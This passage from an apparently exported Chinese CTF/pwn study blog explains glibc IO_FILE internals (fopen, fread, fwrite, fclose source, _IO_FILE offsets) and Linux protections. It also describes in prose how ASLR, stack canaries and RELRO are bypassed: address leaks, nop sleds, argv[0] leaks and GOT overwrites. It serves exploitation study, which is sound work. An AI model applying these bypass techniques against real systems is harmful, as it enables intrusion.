<p>_IO_sgetn 则直接调用 _IO_XSGETN，而 _IO_XSGETN 是一个宏定义，内容是调用 _IO_file_xsgetn，也就是 _IO_FILE_plus.vtable 中保存的 __xsgetn 指针。</p>
<p>_IO_file_xsgetn 函数位于 /glibc/libio/fileops.c。这个函数流程过长，我放到<a href="http://blog.rabb1t.xyz/2022/07/27/IO-FILE%E9%83%A8%E5%88%86%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/#_IO_file_xsgetn">详情</a>中。</p>
<h5 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">fwrite</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* buffer, <span class="keyword">size_t</span> size, <span class="keyword">size_t</span> count, FILE* stream)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>参数</strong></p>
<ul>
<li>buffer: 是一个指针，对 fwrite 来说，是要写入数据的地址;</li>
<li>size: 要写入内容的单字节数;</li>
<li>count: 要进行写入 size 字节的数据项的个数;</li>
<li>stream: 目标文件指针;</li>
</ul>
<p>返回值：实际写入的数据项个数 count。</p>
<p>__write 指向 _IO_fwrite 的代码位于 /libio/iofwrite.c 中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t _IO_fwrite (<span class="keyword">const</span> <span class="keyword">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t request = size * count;</span><br><span class="line">  _IO_size_t written = <span class="number">0</span>;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">    written = _IO_sputn (fp, (<span class="keyword">const</span> <span class="keyword">char</span> *) buf, request);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="comment">/* We have written all of the input in case the return value indicates</span></span><br><span class="line"><span class="comment">     this or EOF is returned.  The latter is a special case where we</span></span><br><span class="line"><span class="comment">     simply did not manage to flush the buffer.  But the data is in the</span></span><br><span class="line"><span class="comment">     buffer and therefore written as far as fwrite is concerned.  */</span></span><br><span class="line">  <span class="keyword">if</span> (written == request || written == EOF)</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> written / size;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_fwrite)</span><br></pre></td></tr></table></figure>

<p>在 _IO_fwrite 中主要是调用_IO_XSPUTN 来实现写入的功能。_IO_sputn 也就是 __xsputn，其对应的默认函数是 _IO_new_file_xsputn 会调用同样位于 vtable 中的 _IO_OVERFLOW。而 _IO_OVERFLOW 默认对应的函数是_IO_new_file_overflow。_IO_new_file_xsputn 与 _IO_new_file_overflow 都位于 /libio/fileops.c 中。<a href="http://blog.rabb1t.xyz/2022/07/27/IO-FILE%E9%83%A8%E5%88%86%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/#_IO_file_xsputn">详情</a></p>
<h5 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">FILE *<span class="title">fopen</span><span class="params">(<span class="keyword">char</span> *filename, *type)</span></span>;</span><br></pre></td></tr></table></figure>

<p>位于 /libio/iofopen.c 中，很短，只是调用了 __fopen_internal。</p>
<h6 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE * _IO_new_fopen (<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __fopen_internal (filename, mode, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>__fopen_internal 主要是四个部分：<a href="http://blog.rabb1t.xyz/2022/07/27/IO-FILE%E9%83%A8%E5%88%86%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/">详情</a></p>
<ul>
<li>malloc分配内存空间。</li>
<li>_IO_no_init 对file结构体进行null初始化。</li>
<li>_IO_file_init 将结构体链接进_IO_list_all链表。</li>
<li>_IO_file_fopen 执行系统调用打开文件。</li>
</ul>
<h6 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h6><ul>
<li>filename: 目标文件的路径</li>
<li>type: 打开方式的类型</li>
</ul>
<p>返回值: 返回一个文件指针</p>
<h5 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h5><p>位于 /libio/iofclose.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fclose</span><span class="params">(FILE *stream)</span></span>;</span><br></pre></td></tr></table></figure>

<h6 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h6><ul>
<li>stream: 文件流指针</li>
</ul>
<h6 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h6><ul>
<li>调用_IO_un_link将文件结构体从_IO_list_all链表中取下。</li>
<li>调用_IO_file_close_it关闭文件并释放缓冲区。</li>
<li>释放FILE内存以及确认文件关闭。</li>
</ul>
<p>详细流程在此<a href="https://messap.github.io/2022/07/27/IO-FILE%E9%83%A8%E5%88%86%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/">IO_FILE部分相关函数详述</a></p>
<h3 id="offset"><a href="#offset" class="headerlink" title="offset"></a>offset</h3><p>具体偏移如下,</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">amd64:</span><br><span class="line">0x0:&#x27;_flags&#x27;,</span><br><span class="line">0x8:&#x27;_IO_read_ptr&#x27;,</span><br><span class="line">0x10:&#x27;_IO_read_end&#x27;,</span><br><span class="line">0x18:&#x27;_IO_read_base&#x27;,</span><br><span class="line">0x20:&#x27;_IO_write_base&#x27;,</span><br><span class="line">0x28:&#x27;_IO_write_ptr&#x27;,</span><br><span class="line">0x30:&#x27;_IO_write_end&#x27;,</span><br><span class="line">0x38:&#x27;_IO_buf_base&#x27;,</span><br><span class="line">0x40:&#x27;_IO_buf_end&#x27;,</span><br><span class="line">0x48:&#x27;_IO_save_base&#x27;,</span><br><span class="line">0x50:&#x27;_IO_backup_base&#x27;,</span><br><span class="line">0x58:&#x27;_IO_save_end&#x27;,</span><br><span class="line">0x60:&#x27;_markers&#x27;,</span><br><span class="line">0x68:&#x27;_chain&#x27;,</span><br><span class="line">0x70:&#x27;_fileno&#x27;,</span><br><span class="line">0x74:&#x27;_flags2&#x27;,</span><br><span class="line">0x78:&#x27;_old_offset&#x27;,</span><br><span class="line">0x80:&#x27;_cur_column&#x27;,</span><br><span class="line">0x82:&#x27;_vtable_offset&#x27;,</span><br><span class="line">0x83:&#x27;_shortbuf&#x27;,</span><br><span class="line">0x88:&#x27;_lock&#x27;,</span><br><span class="line">0x90:&#x27;_offset&#x27;,</span><br><span class="line">0x98:&#x27;_codecvt&#x27;,</span><br><span class="line">0xa0:&#x27;_wide_data&#x27;,</span><br><span class="line">0xa8:&#x27;_freeres_list&#x27;,</span><br><span class="line">0xb0:&#x27;_freeres_buf&#x27;,</span><br><span class="line">0xb8:&#x27;__pad5&#x27;,</span><br><span class="line">0xc0:&#x27;_mode&#x27;,</span><br><span class="line">0xc4:&#x27;_unused2&#x27;,</span><br><span class="line">0xd8:&#x27;vtable&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>参考</strong></p>
<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/io-file/introduction/">CTF Wiki</a><br><a href="https://blog.csdn.net/qq_46441427/article/details/119769510">IO_FILE fread</a><br><a href="https://ray-cp.github.io/">IO_FILE 系列_raycp</a></p>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title>linux保护机制</title>
    <url>/2022/03/08/GCC%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>简单介绍Linux下的保护机制。</p>
<span id="more"></span>

<h2 id="地址随机化-ASLR-PIE"><a href="#地址随机化-ASLR-PIE" class="headerlink" title="地址随机化(ASLR/PIE)"></a>地址随机化(ASLR/PIE)</h2><p>在我们之前介绍的ROP攻击中，我们的主要目的是插入一个指向攻击代码的<strong>指针</strong>，这个代码可以是我们输入的(ret2shellcode)，也可以是程序中有的(ret2text、ret2libc)。</p>
<p>而当我们在同一个操作系统版本上运行同一个程序，即使是不同机器，栈的位置也是固定的，这使得栈地址非常容易被预测。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>栈随机化的思想就是使程序每次运行时，都使得栈的位置在变化。它的简单实现方式是：在程序开始时，在栈上分配一个指定的0~n个字节之间的随机大小空间，程序不使用这段空间，但它会导致程序执行时，后续的栈的位置发生了变化。而这个值n不能太大(太大浪费)，也不能太小(太小得到的随机化地址变化太少)，在32位linux中，地址大致分布在<code>0xff7fc59c</code>到<code>0xffffd09c</code>内,范围大约为2^23^；64位linux中，地址大致分布在<code>0x7fff000比98</code>到<code>0x7ffffffaa4a8</code>内，范围大约为2^32^。</p>
<p> 在Linux中，堆栈地址和动态链接库基地址随机化是属于<strong>地址空间布局随机化</strong>技术中的一种(简称ASLR，address-space layout randomization)，而整个ASLR技术比较复杂。采用ASLR技术，使得每次运行时，除了栈外的程序中的其他段也都会被加载到内存中的不同区域，保护性更强。PIE则是再对整个ELF文件的基地址(代码段数据段受影响)进行随机化。</p>
<h3 id="克服方法"><a href="#克服方法" class="headerlink" title="克服方法"></a>克服方法</h3><ul>
<li>泄露地址<ul>
<li>格式化字符串漏洞泄露栈上地址</li>
<li>构造ROPchain调用输出函数，将got表中存储的地址泄露</li>
</ul>
</li>
<li>若不能泄露地址，也能够通过暴力手段克服随机化保护<ul>
<li>若能够执行到我们写入的攻击代码，那么我们可以在有效的攻击代码前插入很长一段<code>nop</code>指令，然后只需要猜中其中一段指令的地址写入，那么在执行时就一定会执行到有效的攻击代码。这样的整个攻击代码称作”空操作雪橇”(“nop sled”)。</li>
</ul>
</li>
</ul>
<h2 id="栈破坏检测-Stack-Canary"><a href="#栈破坏检测-Stack-Canary" class="headerlink" title="栈破坏检测(Stack Canary)"></a>栈破坏检测(Stack Canary)</h2><p>栈破坏检测能有效的防止利用栈溢出漏洞来破坏栈上的结构</p>
<p><em>canary：金丝雀。矿工下矿前会放一只鸟进去，能够提前预知意外。</em></p>
<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>在栈帧中放入一段canary值，开启了栈破坏检测保护的程序，执行时会随机产生canary。在程序恢复寄存器状态和从函数返回前，程序都会检测canary是否被改变，如果是，那么程序异常结束。</p>
<h3 id="克服方法-1"><a href="#克服方法-1" class="headerlink" title="克服方法"></a>克服方法</h3><p>canary通常存放在栈帧上第一个内存地址中，可以通过调试进行寻找，它的标志是最后一字节为<code>0x00</code>，是为了防止输出下一个内存地址时将其泄露，且该位不属于被检测的部分。</p>
<ul>
<li>泄露canary，之后将其加入payload中的指定位置<ul>
<li>若程序能够输出我们写入的字符串，并且存在栈溢出漏洞，那么能够利用该漏洞将canary的最后一位给覆盖掉，再执行输出时能够泄露。</li>
<li>利用格式化字符串漏洞直接泄露</li>
</ul>
</li>
<li>若不能泄露canary，其实我们能够利用其机制来泄露其他信息，原理是：程序检测canary，实际上是通过调用<code>__stack_chk_fail</code>函数来实现的。在检测到canary异常时，会打印出<code>__libc_argv[0]</code>指针指向的内容，一般为程序名。那么我们利用漏洞，将argv[0]的内容改为其他信息的地址，在执行报错时就会泄露信息。</li>
</ul>
<h2 id="限制可执行代码区域-NX"><a href="#限制可执行代码区域-NX" class="headerlink" title="限制可执行代码区域(NX)"></a>限制可执行代码区域(NX)</h2><p>虚拟内存中，存在’页’的概念，一个页的大小一般是2048或4096个字节。典型的程序保护中，每个页都有一个标志，该标志的每位由硬件检测并指明该页的’可读’、’可写’、’可执行’权限。曾经<code>x86</code>体系将’可读’和’可执行’合并成一个标志位，而栈上数据一定是可读写的，所以会有向栈中写入攻击代码而被执行的危险。虽然有过很多机制，能够限制一些页的可读但是不可执行，却会带来严重的性能损失。</p>
<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>向内存中引入了’NX’(No-Execute)位，将’可读’和’可执行’权限分开来了，而页依旧由硬盘来检测，效率没有损失。</p>
<h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>read only relocation, 可以分为Full Relro和Partial Relro，其作用主要是禁止.GOT节与其他一些内存的可写权限。</p>
<ul>
<li>GCC的默认编译为partial Relro模式，该模式下，一些节和.GOT节是可写的。</li>
<li>而Full Relro模式下，所有地址都在开始时绑定，然后将.GOT表对应的页设置为不可写的权限。</li>
</ul>
<h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>在计算机的大部分需要绑定地址的操作中，都存在一个lazy机制，即需要访问时才会被第一次加载，这样做能极大的提高程序运行的效率。但就是这个lazy binding机制，导致程序需要将进行重定向的.GOT节设置为可写权限，因此黑客可以覆盖该节上的地址为指定目的地址来getshell。</p>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>IO_FILE部分相关函数详述</title>
    <url>/2022/07/27/IO-FILE%E9%83%A8%E5%88%86%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<p>主要是 __fopen_internal、_IO_file_xsgetn、_IO_file_xsputn、_IO_new_fclose</p>
<span id="more"></span>

<h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><p>fopen实际上是 _IO_new_fopen函数，调用了__fopen_internal，主要是创建_IO_FILE结构体初始化并链入_IO_list_all链表，最后打开文件。</p>
<p>fopen的函数调用过程为: _fopen_new_fopen-&gt;__fopen_internal。主要内容在__fopen_internal中。</p>
<p>代码位于/libio/iofopen.c。</p>
<h3 id="fopen-internal"><a href="#fopen-internal" class="headerlink" title="__fopen_internal"></a>__fopen_internal</h3><p>流程很短，仅为创建_IO_FILE结构体，并放入chain中。</p>
<p>参数如下:</p>
<ul>
<li>filename: 文件名</li>
<li>mode: 打开方式</li>
<li>is32: 是否是 32 位</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">__fopen_internal (<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode, <span class="keyword">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 建立一个FILE结构体</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (struct locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (struct locked_FILE)); </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化结构体</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">1</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps; <span class="comment">// 设置 _IO_file_jumps</span></span><br><span class="line">  _IO_file_init (&amp;new_f-&gt;fp); <span class="comment">// 将结构体放入链表</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span>  !_IO_UNIFIED_JUMPTABLES</span></span><br><span class="line">  new_f-&gt;fp.vtable = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="comment">// 打开文件</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 若未返回，则打开文件失败，因此从链中取出并释放内存</span></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="built_in">free</span> (new_f);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="IO-no-init"><a href="#IO-no-init" class="headerlink" title="_IO_no_init"></a>_IO_no_init</h4><p>代码位于 /libio/genops.c。</p>
<p>参数:</p>
<ul>
<li>fp: 文件流指针</li>
<li>flags: _flags</li>
<li>orientation: _mode</li>
<li>wd: 数据对应的地址</li>
<li>jmp: vtable</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_no_init (_IO_FILE *fp, <span class="keyword">int</span> flags, <span class="keyword">int</span> orientation,</span><br><span class="line">	     struct _IO_wide_data *wd, <span class="keyword">const</span> struct _IO_jump_t *jmp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 调用 _IO_old_init，进行初始化，主要是对_flags与缓冲区指针等进行初始化</span></span><br><span class="line">  _IO_old_init (fp, flags);</span><br><span class="line">  <span class="comment">// 再对 _mode、_wide_data、_freeres_list 进行初始化</span></span><br><span class="line">  fp-&gt;_mode = orientation;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">// 根据mode来进行不同的初始化</span></span><br><span class="line">  <span class="keyword">if</span> (orientation &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_wide_data = wd;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_wide_vtable = jmp;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* Cause predictable crash when a wide function is called on a byte</span></span><br><span class="line"><span class="comment">       stream.  */</span></span><br><span class="line">    fp-&gt;_wide_data = (struct _IO_wide_data *) <span class="number">-1L</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  fp-&gt;_freeres_list = <span class="literal">NULL</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h5 id="IO-old-init"><a href="#IO-old-init" class="headerlink" title="_IO_old_init"></a>_IO_old_init</h5><p>设置_flags，缓冲区指针等内容</p>
<p>代码位于/libio/genops.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_old_init (_IO_FILE *fp, <span class="keyword">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">  fp-&gt;_flags = _IO_MAGIC|flags;</span><br><span class="line">  fp-&gt;_flags2 = <span class="number">0</span>;</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_chain = <span class="literal">NULL</span>; <span class="comment">/* Not necessary. */</span></span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_markers = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_cur_column = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> _IO_JUMPS_OFFSET</span></span><br><span class="line">  fp-&gt;_vtable_offset = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_init (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="IO-file-init"><a href="#IO-file-init" class="headerlink" title="_IO_file_init"></a>_IO_file_init</h4><p>初始化了文件流的_offset等内容，并将其链入文件流的链表。</p>
<p>实际函数名是_IO_new_file_init</p>
<p>位于 /libio/fileops.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_new_file_init (struct _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* POSIX.1 allows another file handle to be used to change the position</span></span><br><span class="line"><span class="comment">     of our file descriptor.  Hence we actually don&#x27;t know the actual</span></span><br><span class="line"><span class="comment">     position before we do the first fseek (and until a following fflush). */</span></span><br><span class="line">  <span class="comment">// 初始化</span></span><br><span class="line">  fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class="line">  fp-&gt;file._IO_file_flags |= CLOSED_FILEBUF_FLAGS;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 调用_IO_link_in，将fp链入链表</span></span><br><span class="line">  _IO_link_in (fp);</span><br><span class="line">  <span class="comment">// 初始化_fileno为-1</span></span><br><span class="line">  fp-&gt;file._fileno = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_init, _IO_file_init)</span><br></pre></td></tr></table></figure>

<h5 id="IO-link-in"><a href="#IO-link-in" class="headerlink" title="_IO_link_in"></a>_IO_link_in</h5><p>进行链接操作</p>
<p>位于 /libio/genops.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_link_in (struct _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// _IO_FILE通过_IO_LINKED来标记是否被链接</span></span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (_IO_FILE *) fp;</span><br><span class="line">      _IO_flockfile ((_IO_FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      <span class="comment">// 插入</span></span><br><span class="line">      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line">      ++_IO_list_all_stamp;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((_IO_FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_link_in)</span><br></pre></td></tr></table></figure>

<h4 id="IO-file-fopen"><a href="#IO-file-fopen" class="headerlink" title="_IO_file_fopen"></a>_IO_file_fopen</h4><p>实际函数名为_IO_new_file_init，调用了_IO_file_open打开文件并设置文件流的_flags等内容。</p>
<p>位于 /libio/fileops.c</p>
<p>参数:</p>
<ul>
<li>fp: 文件流指针</li>
<li>filename: 文件名</li>
<li>mode: 打开方式</li>
<li>is32not64: 如其名</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_new_file_fopen (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode,</span><br><span class="line">		    <span class="keyword">int</span> is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> oflags = <span class="number">0</span>, omode;</span><br><span class="line">  <span class="keyword">int</span> read_write;</span><br><span class="line">  <span class="keyword">int</span> oprot = <span class="number">0666</span>;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  _IO_FILE *result;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *cs;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *last_recognized;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检查是否打开文件，已经打开则直接返回</span></span><br><span class="line">  <span class="comment">// _IO_file_is_open将返回_fileno，_IO_FILE使用_fileno来标记文件是否打开</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 根据 mode 的值，设置对应 _flags 的变量。</span></span><br><span class="line">  <span class="keyword">switch</span> (*mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">      omode = O_RDONLY;</span><br><span class="line">      read_write = _IO_NO_WRITES;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">      omode = O_WRONLY;</span><br><span class="line">      oflags = O_CREAT|O_TRUNC;</span><br><span class="line">      read_write = _IO_NO_READS;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">      omode = O_WRONLY;</span><br><span class="line">      oflags = O_CREAT|O_APPEND;</span><br><span class="line">      read_write = _IO_NO_READS|_IO_IS_APPENDING;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span 